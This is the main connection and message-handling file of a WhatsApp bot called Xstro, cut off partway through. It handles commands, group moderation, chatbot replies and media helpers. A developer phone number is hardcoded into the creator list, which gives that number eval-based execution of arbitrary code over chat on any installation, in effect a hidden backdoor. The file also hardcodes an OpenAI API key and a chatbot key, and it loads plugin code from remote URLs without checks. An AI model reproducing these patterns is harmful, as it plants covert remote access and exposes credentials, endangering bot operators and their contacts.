const pino = require("pino");
const axios = require("axios");
const Config = require("../config");
const fs = require("fs-extra");
const FileType = require("file-type");
const path = require("path");
const express = require("express");
const app = express();
const mongoose = require("mongoose");
const { writeFile } = require("fs/promises");
const events = require("./commands");
const PhoneNumber = require("awesome-phonenumber");
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require("./exif");
const {
 default: BotConnect,
 proto,
 prepareWAMessageMedia,
 downloadContentFromMessage,
 useMultiFileAuthState,
 generateForwardMessageContent,
 generateWAMessageFromContent,
 makeInMemoryStore,
 jidDecode,
} = require("@sampandey001/baileys");
const util = require("util");
const Levels = require("discord-xp");
try {
 Levels.setURL(mongodb);
 console.log("🌍 Connected to the Xstro DataBase");
} catch {
 console.log("Could not connect with Mongodb.");
 process.exit(0);
}
const { sck1, plugindb, sleep, getBuffer, tlang, clockString, fetchJson, getSizeMedia, smsg } = require("../lib");
global.db = JSON.parse(fs.readFileSync(__dirname + "/database.json"));
var prefixRegex = Config.prefix === "false" || Config.prefix === "null" ? "^" : new RegExp("^[" + Config.HANDLERS + "]");

const credentialsPath = `${__dirname}/auth/creds.json`;
const sessionName = Config.sessionName ? Config.sessionName.replace(/Session&/g, "") : "";
function split(str, separator) {
  return str.split(separator);
}
exports.split=split
async function MakeSession() {
 try {
  // Check if the credentials file exists
  if (fs.existsSync(credentialsPath)) {
   console.log("Credentials file already exists.");
   return;
  }

  let credentials;

  // Check if the session name is a URL or encoded data
  if (sessionName.length < 30) {
   // Fetch data from the URL
   const response = await axios.get(`https://paste.c-net.org/${sessionName}`);
   credentials = Buffer.from(response.data, "base64").toString("utf8");
  } else {
   // Decode the session name as base64 data
   credentials = Buffer.from(sessionName, "base64").toString("utf8");
  }

  // Write the credentials to the file
  await fs.promises.writeFile(credentialsPath, credentials, "utf8");
  console.log("Credentials file created successfully.");
 } catch (error) {
  console.error("Error creating credentials file:", error);
 }
}

MakeSession();
setTimeout(() => {
 const moment = require("moment-timezone");
 async function main() {
  if (!fs.existsSync(__dirname + "/auth/creds.json")) {
  }
  try {
   await mongoose.connect(mongodb);
  } catch {
   console.log("Could not connect with Mongodb.");
  }
 }
 main();
 const store = makeInMemoryStore({
  logger: pino().child({ level: "silent", stream: "store" }),
 });
 require("events").EventEmitter.defaultMaxListeners = 600;
 const getVersionWaweb = () => {
  let version;
  try {
   let a = fetchJson("https://web.whatsapp.com/check-update?version=1&platform=web");
   version = [a.currentVersion.replace(/[.]/g, ", ")];
  } catch {
   version = [2, 2204, 13];
  }
  return version;
 };
 async function syncdb() {
  let thumbbuffer = await getBuffer(THUMB_IMAGE);
  const ChangePic = __dirname + "/dist/botpic.jpeg";
  await writeFile(ChangePic, thumbbuffer);
  global.log0 = fs.readFileSync(__dirname + "/dist/botpic.jpeg"); //ur logo pic
  const { state, saveCreds } = await useMultiFileAuthState(__dirname + "/auth/");
  const Bot = BotConnect({
   logger: pino({ level: "fatal" }),
   printQRInTerminal: true,
   browser: ["Xstro", "Windows", "Chrome"],
   fireInitQueries: true,
   shouldSyncHistoryMessage: true,
   downloadHistory: true,
   syncFullHistory: true,
   generateHighQualityLinkPreview: true,
   auth: state,
   version: getVersionWaweb() || [2, 2242, 6],
   getMessage: async key => {
    if (store) {
     const msg = await store.loadMessage(key.remoteJid, key.id, undefined);
     return msg.message || undefined;
    }
    return {
     conversation: "An Error Occurred, Repeat Command!",
    };
   },
  });
  store.bind(Bot.ev);
  setInterval(() => {
   store.writeToFile(__dirname + "/store.json");
  }, 30 * 1000);
  Bot.ev.on("messages.upsert", async chatUpdate => {
    const mek = chatUpdate.messages[0];
    if (!mek.message) {
      return;
    }
    if (mek.message.viewOnceMessageV2) {
      return;
    }
    mek.message = Object.keys(mek.message)[0] === "ephemeralMessage" ? mek.message.ephemeralMessage.message : mek.message;
    if (mek.key && mek.key.remoteJid === "status@broadcast" && Config.auto_read_status === "true") {
      await Bot.readMessages([mek.key]);
    }
    const botNumber = await Bot.decodeJid(Bot.user.id);
    if (mek.key && mek.key.remoteJid === "status@broadcast" && Config.auto_status_saver == true) {
      if (mek.message.extendedTextMessage) {
        let cap = mek.message.extendedTextMessage.text;
        await Bot.sendMessage(botNumber, {
          text: cap
        }, {
          quoted: mek
        });
      } else if (mek.message.imageMessage) {
        let cap = mek.message.imageMessage.caption;
        let anu = await Bot.downloadAndSaveMediaMessage(mek.message.imageMessage);
        await Bot.sendMessage(botNumber, {
          image: {
            url: anu
          },
          caption: cap
        }, {
          quoted: mek
        });
      } else if (mek.message.videoMessage) {
        let cap = mek.message.videoMessage.caption;
        let anu = await Bot.downloadAndSaveMediaMessage(mek.message.videoMessage);
        await Bot.sendMessage(botNumber, {
          video: {
            url: anu
          },
          caption: cap
        }, {
          quoted: mek
        });
      }
    }
    if (mek.key && mek.key.remoteJid === "status@broadcast") {
      return;
    }
    try {
      let xstro = await smsg(Bot, JSON.parse(JSON.stringify(mek)), store);
      if (!xstro.message) {
        return;
      }
      if (xstro.isBaileys) {
        return;
      }
      if (xstro.chat.endsWith("broadcast")) {
        return;
      }
      if (Config.alwaysonline === "true") {
        Bot.sendPresenceUpdate("available", xstro.chat);
      }
      var {
        body
      } = xstro;
      var budy = typeof xstro.text == "string" ? xstro.text : false;
      if (body[1] && body[1] == " ") {
        body = body[0] + body.slice(2);
      }
      let icmd = body ? prefixRegex.test(body[0]) : false;
      if (Config.readmessage === "true" && icmd) {
        await Bot.readMessages([mek.key]);
      }
      const args = xstro.body ? body.trim().split(/ +/).slice(1) : null;
      const hgg = botNumber.split("@")[0];
      const quoted = xstro.quoted ? xstro.quoted : xstro;
      const mime = (quoted.msg || quoted).mimetype || "";
      let devss = "919628516236";
      if (xstro.chat === "120363025246125888@g.us" && xstro.sender !== "919628516236@s.whatsapp.net") {
        return;
      }
      let isCreator = [hgg, devss, ...global.owner].map(v => v.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(xstro.sender);
      if (!isCreator && Config.disablepm === "true" && icmd && !xstro.isGroup) {
        return;
      }
      if (!isCreator && Config.WORKTYPE === "private") {
        return;
      }
      if (!isCreator) {
        let checkban = (await sck1.findOne({
          id: xstro.sender
        })) || (await sck1.updateOne({
          id: xstro.sender
        }, {
          name: xstro.pushName
        }));
        let checkg = (await sck.findOne({
          id: xstro.chat
        })) || (await new sck({
          id: xstro.chat
        }).save());
        if (checkg.botenable === "false") {
          return;
        }
        if (icmd && checkban.ban !== "false") {
          return xstro.reply(`*Hii ${xstro.pushName},*\n_You are banned ❌ from using commands._\n_Please contact owner for further information._`);
        }
      }
      const cmdName = icmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
      if (icmd) {
        const cmd = events.commands.find(cmd => cmd.pattern === cmdName) || events.commands.find(cmd => cmd.alias && cmd.alias.includes(cmdName));
        if (cmd) {
          isCreator = [hgg, devss, ...global.owner].map(v => v.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(xstro.sender);
          if (cmd.react) {
            xstro.react(cmd.react);
          }
          let text;
          try {
            text = xstro.body ? body.trim().split(/ +/).slice(1).join(" ") : null;
          } catch {
            text = false;
          }
          try {
            cmd.function(Bot, xstro, text, {
              args,
              isCreator,
              body,
              budy
            });
          } catch (e) {
            console.error("[ERROR] ", e);
          }
        }
      }
      events.commands.map(async command => {
        if (body && command.on === "body") {
          command.function(Bot, xstro, {
            args,
            isCreator,
            icmd,
            body,
            budy
          });
        } else if (xstro.text && command.on === "text") {
          command.function(Bot, xstro, args, {
            isCreator,
            icmd,
            body,
            budy
          });
        } else if ((command.on === "image" || command.on === "photo") && xstro.mtype === "imageMessage") {
          command.function(Bot, xstro, args, {
            isCreator,
            body,
            budy
          });
        } else if (command.on === "sticker" && xstro.mtype === "stickerMessage") {
          command.function(Bot, xstro, args, {
            isCreator,
            body,
            budy
          });
        }
      });
      const groupMetadata = xstro.isGroup ? await Bot.groupMetadata(xstro.chat).catch(e => {}) : "";
      const participants = xstro.isGroup && groupMetadata.participants != undefined ? await groupMetadata.participants : "";
      const groupAdminss = participants => {
        a = [];
        for (let i of participants) {
          if (i.admin == null) {
            continue;
          }
          a.push(i.id);
        }
        return a;
      };
      const groupAdmins = xstro.isGroup ? await groupAdminss(participants) : "";
      const isBotAdmins = xstro.isGroup ? groupAdmins.includes(botNumber) : false;
      const isAdmins = xstro.isGroup ? groupAdmins.includes(xstro.sender) : false;
      if (xstro.isGroup) {
        console.log("Message in Group\nIn=> " + groupMetadata.subject + " " + xstro.sender + "\nMessage:" + xstro.body + "\n----------------------------");
      }
      if (!xstro.isGroup) {
        console.log("Message in Personal\nFrom=> " + xstro.pushName + " " + xstro.sender + "\nMessage:" + xstro.body + "\n----------------------------");
      }
      setInterval(() => {
        fs.writeFileSync(__dirname + "/database.json", JSON.stringify(global.db, null, 2));
      }, 10000);
      try {
        let GroupS = await sck.findOne({
          id: xstro.chat
        });
        if (GroupS) {
          let mongoschema = GroupS.antilink || "false";
          let jackpot = budy.toLowerCase();
          if (xstro.isGroup && !isAdmins && mongoschema == "true") {
            if (isAdmins) {
              return;
            }
            //  let pattern = new RegExp(`\\b${['chat.whatsapp.com']}\\b`, 'ig');
            var array = Config.antilink.split(",");
            array.map(async bg => {
              let pattern = new RegExp(`\\b${bg}\\b`, "ig");
              let chab = budy.toLowerCase();
              if (pattern.test(chab)) {
                if (!isBotAdmins) {
                  let buttonMessage = {
                    text: `*---  Link detected  ---*
  @${xstro.sender.split("@")[0]} detected sending a link.
  Promote ${tlang().title} as admin to kick
  link senders.
  `,
                    mentions: [xstro.sender],
                    headerType: 4
                  };
                  Bot.sendMessage(xstro.chat, buttonMessage);
                  return;
                }
  
                //  console.log('Whatsapp link')
                let response = await Bot.groupInviteCode(xstro.chat);
                h = "chat.whatsapp.com/" + response;
                let patternn = new RegExp(`\\b${[h]}\\b`, "ig");
                if (patternn.test(body)) {
                  xstro.reply(`I won't remove you for sending this group link.`);
                  return;
                }
                const key = {
                  remoteJid: xstro.chat,
                  fromMe: false,
                  id: xstro.id,
                  participant: xstro.sender
                };
                await Bot.sendMessage(xstro.chat, {
                  delete: key
                });
                xstro.reply("Group Link Detected!!");
                try {
                  await Bot.groupParticipantsUpdate(xstro.chat, [xstro.sender], "remove");
                } catch {
                  xstro.reply("*Link Detected*\n" + tlang().botAdmin);
                }
              }
            });
          }
        }
      } catch (err) {
        console.log(err);
      }
      const {
        chatbot
      } = require("../lib/");
      let checkbot = (await chatbot.findOne({
        id: "chatbot"
      })) || (await new chatbot({
        id: "chatbot"
      }).save());
      let checkon = checkbot.worktype;
      if (checkon === "true" && !icmd) {
        console.log("chatbot is on");
        if (xstro.key.fromMe) {
          return;
        }
        let zx = xstro.text.length;
        try {
          if (xstro.isGroup && !xstro.quoted && !icmd) {
            return;
          }
          if (xstro.text && !xstro.isGroup) {
            if (zx < 25) {
              var diffuser = xstro.sender.split("@")[0];
              let fetchk = require("node-fetch");
              var textuser = budy;
              let fetchtext = await fetchk(`http://api.brainshop.ai/get?bid=167991&key=aozpOoNOy3dfLgmB&uid=[${diffuser}]&msg=[${textuser}]`);
              let json = await fetchtext.json();
              let {
                cnt
              } = json;
              xstro.reply(cnt);
              console.log("CHATBOT RESPONSE\ntext=>" + textuser + "\n\nResponse=>" + cnt);
              return;
            }
            const {
              Configuration,
              OpenAIApi
            } = require("openai");
            const configuration = new Configuration({
              apiKey: Config.OPENAI_API_KEY || "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"
            });
            const openai = new OpenAIApi(configuration);
            const completion = await openai.createCompletion({
              model: "text-davinci-002",
              prompt: budy,
              temperature: 0.5,
              max_tokens: 80,
              top_p: 1,
              frequency_penalty: 0.5,
              presence_penalty: 0,
              stop: ["\"\"\""]
            });
            xstro.reply(completion.data.choices[0].text);
          } else if (xstro.text && !icmd && xstro.isGroup && xstro.quoted) {
            let mention = xstro.mentionedJid ? xstro.mentionedJid[0] : xstro.msg.contextInfo.participant || false;
            if (mention && !mention.includes(botNumber)) {
              return;
            }
            if (zx < 20) {
              var diffuser = xstro.sender.split("@")[0];
              let fetchk = require("node-fetch");
              let fetchtext = await fetchk(`http://api.brainshop.ai/get?bid=167991&key=aozpOoNOy3dfLgmB&uid=[${diffuser}]&msg=[${xstro.text}]`);
              let json = await fetchtext.json();
              let {
                cnt
              } = json;
              console.log(cnt);
              xstro.reply(cnt);
              return;
            }
            //	if (!querie && !quoted) return xstro.reply(`Hey there! ${pushname}. How are you doing these days?`);
            const {
              Configuration,
              OpenAIApi
            } = require("openai");
            const configuration = new Configuration({
              apiKey: Config.OPENAI_API_KEY || "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"
            });
            const openai = new OpenAIApi(configuration);
            //	let textt = text ? text : xstro.quoted && xstro.quoted.text ? xstro.quoted.text : xstro.text;
            const completion = await openai.createCompletion({
              model: "text-davinci-002",
              prompt: budy,
              temperature: 0.5,
              max_tokens: 80,
              top_p: 1,
              frequency_penalty: 0.5,
              presence_penalty: 0,
              stop: ["\"\"\""]
            });
            xstro.reply(completion.data.choices[0].text);
          }
          return;
        } catch (err) {
          console.log(err);
        }
      }
      var array = Config.antibadword.split(",");
      array.map(async reg => {
        if (isAdmins) {
          return;
        }
        let pattern = new RegExp(`\\b${reg}\\b`, "ig");
        let chab = budy.toLowerCase();
        if (pattern.test(chab)) {
          await new Promise(r => setTimeout(r, 1000));
          try {
            const {
              warndb
            } = require(".");
            const timesam = moment(moment()).format("HH:mm:ss");
            moment.tz.setDefault("Africa/Lagos").locale("id");
            await new warndb({
              id: xstro.sender.split("@")[0] + "warn",
              reason: "For using Bad Word",
              group: groupMetadata.subject,
              warnedby: tlang().title,
              date: timesam
            }).save();
            xstro.reply(`
  *_hey ${xstro.pushName}_*\n
  Warning!! Bad word detected.
  delete your message.
  `);
            sleep(3000);
            const key = {
              remoteJid: xstro.chat,
              fromMe: false,
              id: xstro.id,
              participant: xstro.sender
            };
            await Bot.sendMessage(xstro.chat, {
              delete: key
            });
          } catch (e) {
            console.log(e);
          }
        }
        return;
      });
      try {
        let isNumber = x => typeof x === "number" && !isNaN(x);
        let user = global.db.users[xstro.sender];
        if (typeof user !== "object") {
          global.db.users[xstro.sender] = {};
        }
        if (user) {
          if (!isNumber(user.afkTime)) {
            user.afkTime = -1;
          }
          if (!("afkReason" in user)) {
            user.afkReason = "";
          }
        } else {
          global.db.users[xstro.sender] = {
            afkTime: -1,
            afkReason: ""
          };
        }
        let chats = global.db.chats[xstro.chat];
        if (typeof chats !== "object") {
          global.db.chats[xstro.chat] = {};
        }
        if (chats) {
          if (!("mute" in chats)) {
            chats.mute = false;
          }
          if (!("wame" in chats)) {
            chats.wame = false;
          }
        } else {
          global.db.chats[xstro.chat] = {
            mute: false,
            wame: false
          };
        }
      } catch (err) {
        console.error(err);
      }
      //responce
      let mentionUser = [...new Set([...(xstro.mentionedJid || []), ...(xstro.quoted ? [xstro.quoted.sender] : [])])];
      for (let jid of mentionUser) {
        let user = global.db.users[jid];
        if (!user) {
          continue;
        }
        let afkTime = user.afkTime;
        if (!afkTime || afkTime < 0) {
          continue;
        }
        let reason = user.afkReason || "";
        reply(`
  Hello ${xstro.pushName} \n\n, this is *${tlang().title}* a bot.
  Don't tag him,he is busy now. But Don't worry I assure you,I'll inform him As soon as possible😉.
  ${reason ? "with reason " + reason : "no reason"}
  Its been ${clockString(new Date() - afkTime)}\n\nThanks\n*Powered by ${tlang().title}*
  `.trim());
      }
      if (db.users[xstro.sender].afkTime > -1) {
        let user = global.db.users[xstro.sender];
        reply(`
  ${tlang().greet} came back online from AFK${user.afkReason ? " after " + user.afkReason : ""}
  In ${clockString(new Date() - user.afkTime)}
  `.trim());
        user.afkTime = -1;
        user.afkReason = "";
      }
      if (isCreator && xstro.text.startsWith(">")) {
        let code = budy.slice(2);
        if (!code) {
          xstro.reply(`Provide me with a query to run Master!`);
          return;
        }
        try {
          let resultTest = eval(code);
          if (typeof resultTest === "object") {
            xstro.reply(util.format(resultTest));
          } else {
            xstro.reply(util.format(resultTest));
          }
        } catch (err) {
          xstro.reply(util.format(err));
        }
        return;
      }
      if (isCreator && xstro.text.startsWith("$")) {
        let code = budy.slice(2);
        if (!code) {
          xstro.reply(`Provide Code For Excution.`);
          return;
        }
        try {
          let resultTest = await eval("const a = async()=>{\n" + code + "\n}\na()");
          let h = util.format(resultTest);
          if (h === undefined) {
            return console.log(h);
          } else {
            xstro.reply(h);
          }
        } catch (err) {
          if (err === undefined) {
            return console.log("error");
          } else {
            xstro.reply(util.format(err));
          }
        }
        return;
      }
    } catch (e) {
      console.log(e);
    }
  });
  const { sck } = require(".");
  async function startcron(time, chat, type) {
   let cron = require("node-cron");
   console.log(time);
   console.log(chat);
   console.log(type);
   let [hr, min] = time.split(":");
   var j;
   if (type === "mute") j = "announcement";
   if (type === "unmute") j = "not_announcement";
   cron.schedule(
    `${min} ${hr} * * *`,
    () => {
     (async () => {
      return await Bot.groupSettingUpdate(chat, j);
     })();
    },
    {
     scheduled: true,
     timezone: "Africa/Lagos",
    }
   );
  }
  async function foo() {
   let bar = await sck.find({});
   for (let i = 0; i < bar.length; i++) {
    if (bar[i].mute === "false") continue;
    if (bar[i].mute === undefined) continue;
    await startcron(bar[i].mute, bar[i].id, "mute");
   }
  }
  async function fooz() {
   let barz = await sck.find({});
   for (let i = 0; i < barz.length; i++) {
    if (barz[i].unmute === "false") continue;
    if (barz[i].unmute === undefined) continue;
    await startcron(barz[i].unmute, barz[i].id, "unmute");
   }
  }
  foo();
  fooz();

  if (Config.autobio == true) {
   console.log("changing about");
   let cron = require("node-cron");
   cron.schedule(
    "1 * * * *",
    async () => {
     async function updateStatus() {
      const { fetchJson } = require("../lib");
      var q = "`";
      var resultt = await fetchJson(`https://api.popcat.xyz/pickuplines`);
      var textt = resultt.pickupline;
      var time = moment().format("HH:mm");
      moment.tz.setDefault("Africa/Lagos").locale("id");
      var date = moment.tz("Africa/Lagos").format("DD/MM/YYYY");
      var status = `${textt} \n⏰Time: ${time} \n🚀xsᴛʀᴏ ʙᴏᴛ`;
      await Bot.updateProfileStatus(status);
     }
     await updateStatus();
    },
    {
     scheduled: true,
     timezone: "Africa/Lagos",
    }
   );
  }
  Bot.ev.on("group-participants.update", async anu => {
   try {
    let metadata = await Bot.groupMetadata(anu.id);
    let participants = anu.participants;
    for (let num of participants) {
     var ppuser;
     try {
      ppuser = await Bot.profilePictureUrl(num, "image");
     } catch {
      ppuser = "https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg";
     }
     if (Config.antifake != "") {
      var array = Config.antifake.split(",") || "234";
      for (let i = 0; i < array.length; i++) {
       let chab = require("awesome-phonenumber")("+" + num.split("@")[0]).getCountryCode();
       if (chab === array[i]) {
        console.log(array[i]);
        try {
         Bot.sendMessage(anu.id, { text: `${chab} is not allowed` });
         return await Bot.groupParticipantsUpdate(anu.id, [num], "remove");
        } catch {
         console.log("error");
        }
       }
      }
     }
     let checkinfo = await sck.findOne({ id: anu.id });
     if (checkinfo) {
      let events = checkinfo.events || "false";
      if (anu.action == "add" && events == "true") {
       hesa = `${participants}`;
       getnum = teks => {
        return teks.replace(/['@s whatsapp.net']/g, " ");
       };
       resa = `${getnum(hesa)}`;
       const totalmem = metadata.participants.length;
       let welcome_messages = checkinfo.welcome
        .replace(/@user/gi, `@${num.split("@")[0]}`)
        .replace(/@gname/gi, metadata.subject)
        .replace(/@desc/gi, metadata.desc)
        .replace(/@count/gi, totalmem);
       if (/@pp/g.test(welcome_messages)) {
        let buttonMessage = {
         image: { url: ppuser },
         caption: welcome_messages.trim().replace(/@pp/g, ""),
         footer: `${Config.botname}`,
         mentions: [num],
         headerType: 4,
        };
        return await Bot.sendMessage(anu.id, buttonMessage);
       } else {
        return Bot.sendMessage(anu.id, { text: welcome_messages.trim(), mentions: [num] });
       }
      } else if (events === "true" && anu.action == "remove") {
       hesa = `${participants}`;
       getnum = teks => {
        return teks.replace(/['@s whatsapp.net']/g, " ");
       };
       resa = `${getnum(hesa)}`;
       const allmem = metadata.participants.length;
       let goodbye_messages = checkinfo.goodbye
        .replace(/@user/gi, `@${num.split("@")[0]}`)
        .replace(/@gname/gi, metadata.subject)
        .replace(/@desc/gi, metadata.desc)
        .replace(/@count/gi, allmem);
       if (/@pp/g.test(goodbye_messages)) {
        let buttonMessage = {
         image: { url: ppuser },
         caption: goodbye_messages.trim().replace(/@pp/g, ""),
         footer: `${Config.botname}`,
         mentions: [num],
         headerType: 4,
        };
        return Bot.sendMessage(anu.id, buttonMessage);
       } else {
        return Bot.sendMessage(anu.id, { text: goodbye_messages.trim(), mentions: [num] });
       }

       //=============================[Implementing Promote and Demote Messages.]===================================================
      } else if (anu.action == "promote") {
       var ppUrl;
       try {
        ppUrl = await Bot.profilePictureUrl(num, "image");
       } catch {
        ppurl = "https://i.ibb.co/6BRf4Rc/Hans-Bot-No-Profile.png";
       }
       let buttonMessage = {
        image: { url: ppUrl },
        caption: `[ NEW ADMIN FOUND ]\n\nName : @${num.split("@")[0]}Is an Admin\nGroup : ${metadata.subject}`,
        footer: `Xstro`,
        mentions: [num],
        headerType: 4,
       };
       Bot.sendMessage(anu.id, buttonMessage);
      } else if (anu.action == "demote") {
       try {
        ppUrl = await Bot.profilePictureUrl(num, "image");
       } catch {
        ppUrl = "https://i.ibb.co/6BRf4Rc/Hans-Bot-No-Profile.png";
       }
       let buttonMessage = {
        image: { url: ppUrl },
        caption: `[ ADMIN ROLE REMOVED ]\n\nName : @${num.split("@")[0]}Is No Longer An Admin`,
        footer: `Xstro`,
        mentions: [num],
        headerType: 4,
       };
       Bot.sendMessage(anu.id, buttonMessage);
      }
     }
    }
   } catch (err) {
    console.log(err);
   }
  });
  //========================================================================================================================================
  Bot.decodeJid = jid => {
   if (!jid) return jid;
   if (/:\d+@/gi.test(jid)) {
    let decode = jidDecode(jid) || {};
    return (decode.user && decode.server && decode.user + "@" + decode.server) || jid;
   } else return jid;
  };
  //========================================================================================================================================
  Bot.ev.on("contacts.upsert", contacts => {
   const contactsUpsert = newContacts => {
    for (const contact of newContacts) {
     if (store.contacts[contact.id]) {
      Object.assign(store.contacts[contact.id], contact);
     } else {
      store.contacts[contact.id] = contact;
     }
    }
    return;
   };
   contactsUpsert(contacts);
  });
  //========================================================================================================================================
  Bot.ev.on("contacts.update", async update => {
   for (let contact of update) {
    let id = Bot.decodeJid(contact.id);
    sck1.findOne({ id: id }).then(usr => {
     if (!usr) {
      new sck1({ id: id, name: contact.notify }).save();
     } else {
      sck1.updateOne({ id: id }, { name: contact.notify });
     }
    });
    if (store && store.contacts) store.contacts[id] = { id, name: contact.notify };
   }
  });
  //========================================================================================================================================
  Bot.getName = (jid, withoutContact = false) => {
   id = Bot.decodeJid(jid);

   withoutContact = Bot.withoutContact || withoutContact;

   let v;

   if (id.endsWith("@g.us"))
    return new Promise(async resolve => {
     v = store.contacts[id] || {};

     if (!(v.name.notify || v.subject)) v = Bot.groupMetadata(id) || {};

     resolve(v.name || v.subject || PhoneNumber("+" + id.replace("@s.whatsapp.net", "")).getNumber("international"));
    });
   else
    v =
     id === "0@s.whatsapp.net"
      ? {
         id,

         name: "WhatsApp",
        }
      : id === Bot.decodeJid(Bot.user.id)
      ? Bot.user
      : store.contacts[id] || {};

   return (withoutContact ? "" : v.name) || v.subject || v.verifiedName || PhoneNumber("+" + jid.replace("@s.whatsapp.net", "")).getNumber("international");
  };
  //========================================================================================================================================
  Bot.sendContact = async (jid, kon, quoted = "", opts = {}) => {
   let list = [];
   for (let i of kon) {
    list.push({
     displayName: await Bot.getName(i + "@s.whatsapp.net"),
     vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await Bot.getName(i + "@s.whatsapp.net")}\nFN:${global.OwnerName}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${
      global.email
     }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${global.github}/Xstro-Bot\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${global.location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
    });
   }
   Bot.sendMessage(jid, { contacts: { displayName: `${list.length} Contact`, contacts: list }, ...opts }, { quoted });
  };
  //========================================================================================================================================
  Bot.setStatus = status => {
   Bot.query({
    tag: "iq",
    attrs: {
     to: "@s.whatsapp.net",
     type: "set",
     xmlns: "status",
    },
    content: [
     {
      tag: "status",
      attrs: {},
      content: Buffer.from(status, "utf-8"),
     },
    ],
   });
   return status;
  };
  Bot.serializeM = xstro => smsg(Bot, xstro, store);
  //========================================================================================================================================
  Bot.ev.on("connection.update", async update => {
   const { connection, lastDisconnect } = update;

   if (connection === "connecting") {
    console.log(`ℹ️ Connecting to WhatsApp... Please Wait.`);
   }

   if (connection === "open") {
    console.log(`✅ Login Successful!`);
    console.log(`⬇️  Installing External Plugins...`);
    let axios = require("axios");
    let check = await plugindb.find({});

    for (let i = 0; i < check.length; i++) {
     let AxiosData = await axios.get(check[i].url);
     let data = AxiosData.data;
     await fs.writeFileSync(`${__dirname}/../commands/${check[i].id}.js`, data, "utf8");
    }

    console.log(`✅  External Plugins Installed!`);

    fs.readdirSync(`${__dirname}/../commands`).forEach(plugin => {
     if (path.extname(plugin).toLowerCase() == ".js") {
      require(`${__dirname}/../commands/${plugin}`);
     }
    });

    for (let i of owner) {
     const read = Config.readmessage == false ? "Read Message: ❌" : Config.readmessage == undefined ? "Read Message: ❌" : Config.readmessage === "false" ? "Read Message: ❌" : "Read Message: ✅";

     const ars =
      Config.auto_read_status == false
       ? "Auto Read Status: ❌"
       : Config.auto_read_status == undefined
       ? "Auto Read Status: ❌"
       : Config.auto_read_status === "false"
       ? "Auto Read Status: ❌"
       : "Auto Read Status: ✅";

     const dp = Config.disablepm == false ? "Disable PM:❌" : Config.disablepm == undefined ? "Disable PM:❌" : Config.disablepm === "false" ? "Disable PM: ❌" : "Disable PM: ✅";
     const ar = Config.autoreaction == false ? "Auto Reaction:❌" : Config.autoreaction == undefined ? "Auto Reaction:❌" : Config.autoreaction === "false" ? "Auto Reaction: ❌" : "Auto Reaction: ✅";

     Bot.sendMessage(`${i}@s.whatsapp.net`, {
      text: `_Xstro V1 Is Alive._
_Total Plugins : ${events.commands.length}_
_Mode: ${Config.WORKTYPE}_
_Version:- 0.0.5_
_Branch:- ${Config.BRANCH}_
_Owner:- ${process.env.OWNER_NAME}_

*Extra Configrations:*
${read}
${ars}
${dp}
${ar}`,
     });
    }
   }

   if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode != 401) {
    console.log(`Connection closed with bot. Please put New Session ID again.`);
    await sleep(50000);
    syncdb().catch(err => console.log(err));
   }
  });

  Bot.ev.on("creds.update", saveCreds);
  //================================================[Some Params]===============================================================================
  /** Send Button 5 Image
   *
   * @param {*} jid
   * @param {*} text
   * @param {*} footer
   * @param {*} image
   * @param [*] button
   * @param {*} options
   * @returns
   */
  //========================================================================================================================================
  Bot.send5ButImg = async (jid, text = "", footer = "", img, but = [], thumb, options = {}) => {
   let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: Bot.waUploadToServer });
   var template = generateWAMessageFromContent(
    jid,
    proto.Message.fromObject({
     templateMessage: {
      hydratedTemplate: {
       imageMessage: message.imageMessage,
       hydratedContentText: text,
       hydratedFooterText: footer,
       hydratedButtons: but,
      },
     },
    }),
    options
   );
   Bot.relayMessage(jid, template.message, { messageId: template.key.id });
  };

  /**
   *
   * @param {*} jid
   * @param {*} buttons
   * @param {*} caption
   * @param {*} footer
   * @param {*} quoted
   * @param {*} options
   */
  //========================================================================================================================================
  Bot.sendButtonText = (jid, buttons = [], text, footer, quoted = "", options = {}) => {
   let buttonMessage = {
    text,
    footer,
    buttons,
    headerType: 2,
    ...options,
   };
   //========================================================================================================================================
   Bot.sendMessage(jid, buttonMessage, { quoted, ...options });
  };

  /**
   *
   * @param {*} jid
   * @param {*} text
   * @param {*} quoted
   * @param {*} options
   * @returns
   */
  //========================================================================================================================================
  Bot.sendText = (jid, text, quoted = "", options) => Bot.sendMessage(jid, { text: text, ...options }, { quoted });

  /**
   *
   * @param {*} jid
   * @param {*} path
   * @param {*} caption
   * @param {*} quoted
   * @param {*} options
   * @returns
   */
  //========================================================================================================================================
  Bot.sendImage = async (jid, path, caption = "", quoted = "", options) => {
   let buffer = Buffer.isBuffer(path)
    ? path
    : /^data:.*?\/.*?;base64,/i.test(path)
    ? Buffer.from(path.split`,`[1], "base64")
    : /^https?:\/\//.test(path)
    ? await await getBuffer(path)
    : fs.existsSync(path)
    ? fs.readFileSync(path)
    : Buffer.alloc(0);
   return await Bot.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted });
  };

  /**
   *
   * @param {*} jid
   * @param {*} path
   * @param {*} caption
   * @param {*} quoted
   * @param {*} options
   * @returns
   */
  //========================================================================================================================================
  Bot.sendTextWithMentions = async (jid, text, quoted, options = {}) =>
   Bot.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + "@s.whatsapp.net") }, ...options }, { quoted });

  /**
   *
   * @param {*} jid
   * @param {*} path
   * @param {*} quoted
   * @param {*} options
   * @returns
   */
  //========================================================================================================================================
  Bot.sendImageAsSticker = async (jid, buff, options = {}) => {
   let buffer;
   if (options && (options.packname || options.author)) {
    buffer = await writeExifImg(buff, options);
   } else {
    buffer = await imageToWebp(buff);
   }
   await Bot.sendMessage(jid, { sticker: { url: buffer }, ...options }, options);
  };
  /**
   *
   * @param {*} jid
   * @param {*} path
   * @param {*} quoted
   * @param {*} options
   * @returns
   */
  Bot.sendVideoAsSticker = async (jid, buff, options = {}) => {
   let buffer;
   if (options && (options.packname || options.author)) {
